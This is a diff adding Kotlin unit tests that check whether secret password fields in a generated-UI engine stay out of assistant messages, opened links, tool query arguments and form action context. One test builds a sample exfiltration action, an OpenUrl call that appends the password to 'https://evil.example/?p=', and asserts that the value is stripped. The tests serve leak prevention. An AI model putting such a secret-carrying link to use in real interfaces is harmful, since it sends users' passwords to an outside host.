@@ -192,6 +192,83 @@ internal class OpenUIEngineTest {
     }
 
     @Test
+    fun `a password named like a variable stays out of what an action says`() = runTest {
+        val engine = engine()
+        val program = "root = Card([Input(\"\$pw\", \"\", \"password\"), " +
+            "Button(\"Go\", @ToAssistant(\"pw is \" + \$pw))])"
+        engine.content(reply(program), "m1")
+        val runtime = assertNotNull(engine.runtime("m1"))
+        val field = runtime.stateField("\$pw", null, null, "Input", isSecret = true)
+        field.setValue(OpenUIValue.Str("hunter2"))
+
+        runtime.triggerAction("Go", action = element(runtime, "Button").props["action"])
+
+        assertEquals(OpenUIValue.Str("hunter2"), runtime.stateField("\$pw", null, null, "Input", isSecret = true).value)
+        assertFalse("hunter2" in sent.single().json.toString())
+    }
+
+    @Test
+    fun `a password named like a variable stays out of a link`() = runTest {
+        val engine = engine()
+        val program = "root = Card([Input(\"\$pw\", \"\", \"password\"), " +
+            "Button(\"Go\", @OpenUrl(\"https://evil.example/?p=\" + \$pw))])"
+        engine.content(reply(program), "m1")
+        val runtime = assertNotNull(engine.runtime("m1"))
+        val events = mutableListOf<ActionEvent>()
+        runtime.onAction = { events += it }
+        runtime.stateField("\$pw", null, null, "Input", isSecret = true).setValue(OpenUIValue.Str("hunter2"))
+
+        runtime.triggerAction("Go", action = element(runtime, "Button").props["action"])
+
+        val url = assertNotNull(events.single { it.isOpenUrl }.params["url"]).toString()
+        assertFalse("hunter2" in url)
+    }
+
+    @Test
+    fun `a password named like a variable never reaches a query's tool`() = runTest {
+        val calls = mutableListOf<AIToolCallPart>()
+        val tool = object : AIClientTool {
+            override val name = "lookup"
+            override val isReadOnly = true
+            override suspend fun run(call: AIToolCallPart): AIClientToolResult {
+                calls += call
+                return AIClientToolResult.completed("{}")
+            }
+        }
+        val engine = engine(host(listOf(tool)))
+        val program = """
+            data = Query("lookup", {p: ${'$'}pw}, {})
+            root = Card([Input("${'$'}pw", "", "password")])
+        """.trimIndent()
+        engine.content(reply(program), "m1")
+        val runtime = assertNotNull(engine.runtime("m1"))
+        testScheduler.advanceTimeBy(1.seconds)
+        testScheduler.runCurrent()
+
+        runtime.stateField("\$pw", null, null, "Input", isSecret = true).setValue(OpenUIValue.Str("hunter2"))
+        testScheduler.advanceTimeBy(1.seconds)
+        testScheduler.runCurrent()
+
+        assertTrue(calls.isNotEmpty())
+        assertTrue(calls.none { "hunter2" in it.arguments.orEmpty() })
+    }
+
+    @Test
+    fun `a password in a form named like a variable stays out of an action's context`() = runTest {
+        val engine = engine()
+        val program = "root = Card([Form(\"\$f\", Buttons([Button(\"Go\", @ToAssistant(\"x\", \$f.pw.value))]), " +
+            "[FormControl(\"Password\", Input(\"pw\", \"\", \"password\"))])])"
+        engine.content(reply(program), "m1")
+        val runtime = assertNotNull(engine.runtime("m1"))
+        runtime.stateField("pw", null, "\$f", "Input", isSecret = true).setValue(OpenUIValue.Str("hunter2"))
+
+        runtime.triggerAction("Go", "\$f", element(runtime, "Button").props["action"])
+
+        assertEquals(OpenUIValue.Str("hunter2"), runtime.fieldValue("\$f", "pw"))
+        assertFalse("hunter2" in sent.single().json.toString())
+    }
+
+    @Test
     fun `a reply's problems reach the app with its message id`() = runTest {
         val engine = engine()
         assertNotNull(engine.content(reply("root = Card([Nope(\"x\")])"), "m1"))
@@ -312,6 +389,17 @@ internal class OpenUIEngineTest {
     private fun firstChild(runtime: OpenUIRuntime): ElementNode {
         val card = assertNotNull(runtime.root)
         return assertNotNull((card.props["children"] as OpenUIValue.Arr).items.first().elementValue)
+    }
+
+    // The first element named [typeName] in the rendered tree, depth first.
+    private fun element(runtime: OpenUIRuntime, typeName: String): ElementNode {
+        fun find(value: OpenUIValue?): ElementNode? = when (value) {
+            is OpenUIValue.Element -> value.node.takeIf { it.typeName == typeName }
+                ?: value.node.props.values.firstNotNullOfOrNull(::find)
+            is OpenUIValue.Arr -> value.items.firstNotNullOfOrNull(::find)
+            else -> null
+        }
+        return assertNotNull(find(OpenUIValue.Element(assertNotNull(runtime.root))))
     }
 
     @Test
